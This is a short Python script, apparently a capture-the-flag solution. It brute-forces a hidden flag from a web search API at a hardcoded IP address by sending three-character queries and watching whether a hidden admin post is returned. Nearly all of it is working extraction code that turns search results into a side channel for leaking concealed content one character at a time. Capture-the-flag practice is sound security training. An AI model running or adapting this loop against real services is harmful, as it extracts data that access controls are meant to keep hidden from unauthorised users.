import requests

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}!@#$%^&*()-+=[]|;:,.<>?~`'
discovered = 'her'  # có thể brute từ '' nếu cần

def test_triplet(query):
    try:
        res = requests.post(
            'http://34.134.162.213:17000/api/search',
            json={'query': query}
        )
        data = res.json()

        for post in data['results']:
            if (post['title'] == "Not the flag?" and
                post['author'] == "admin" and
                post['date'] == "2025-05-13" and
                post['content'].startswith("Well luckily the content of the flag is hidden")):
                
                print(f'\n🔍 Query "{query}" matched expected post.')
                print(f'🧾  Content: {post["content"]}')
                return True

    except Exception as e:
        print('❌ Error:', e)

    return False

while True:
    found = False
    for c in charset:
        triplet = discovered[-2:] + c
        if test_triplet(triplet):
            discovered += c
            print(f'\n✅ Flag so far: {discovered}')
            found = True
            break
    if not found:
        print('\n⛔️ No more matches. Done.')
        break

